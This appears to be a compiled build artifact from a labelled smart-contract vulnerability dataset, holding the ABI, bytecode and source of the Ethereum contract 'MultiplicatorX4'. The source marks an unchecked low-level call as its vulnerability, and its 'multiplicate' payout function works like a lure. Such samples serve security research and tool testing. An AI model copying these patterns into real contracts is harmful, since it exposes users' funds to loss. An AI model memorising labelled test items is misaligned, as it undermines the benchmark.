{
  "contractName": "MultiplicatorX4",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "adr",
          "type": "address"
        },
        {
          "name": "data",
          "type": "bytes"
        }
      ],
      "name": "Command",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "adr",
          "type": "address"
        }
      ],
      "name": "multiplicate",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005057600080fd5b50610410806100606000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631ac9f70d146100645780633ccfd60b1461009a578063b4a99a4e146100a4578063ba21d62a146100fb575b005b610098600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610177565b005b6100a26101fb565b005b3480156100b057600080fd5b506100b96102d7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610175600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506102fc565b005b3073ffffffffffffffffffffffffffffffffffffffff1631341015156101f8578073ffffffffffffffffffffffffffffffffffffffff166108fc343073ffffffffffffffffffffffffffffffffffffffff1631019081150290604051600060405180830381858888f193505050501580156101f6573d6000803e3d6000fd5b505b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561025657600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102d4573d6000803e3d6000fd5b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561035757600080fd5b8173ffffffffffffffffffffffffffffffffffffffff16348260405180828051906020019080838360005b8381101561039d578082015181840152602081019050610382565b50505050905090810190601f1680156103ca5780820380516001836020036101000a031916815260200191505b5091505060006040518083038185875af1925050505050505600a165627a7a7230582066ac90be993e6fe6b45693e27882164af87c672e0912c12afc9bb7924832bd850029",
  "source": "/*\r\n * @source: etherscan.io \r\n * @author: -\r\n * @vulnerable_at_lines: 29\r\n */\r\n\r\n pragma solidity ^0.4.18;\r\n\r\ncontract MultiplicatorX4\r\n{\r\n    address public Owner = msg.sender;\r\n   \r\n    function() public payable{}\r\n   \r\n    function withdraw()\r\n    payable\r\n    public\r\n    {\r\n        require(msg.sender == Owner);\r\n        Owner.transfer(this.balance);\r\n    }\r\n    \r\n    function Command(address adr,bytes data)\r\n    payable\r\n    public\r\n    {\r\n        require(msg.sender == Owner);\r\n        // <yes> <report> UNCHECKED_LL_CALLS\r\n        adr.call.value(msg.value)(data);\r\n    }\r\n    \r\n    function multiplicate(address adr)\r\n    public\r\n    payable\r\n    {\r\n        if(msg.value>=this.balance)\r\n        {        \r\n            adr.transfer(this.balance+msg.value);\r\n        }\r\n    }\r\n}",
  "sourcePath": "/workdir/truffle_example/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859/contracts/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.8",
  "updatedAt": "2022-08-11T04:03:12.206Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}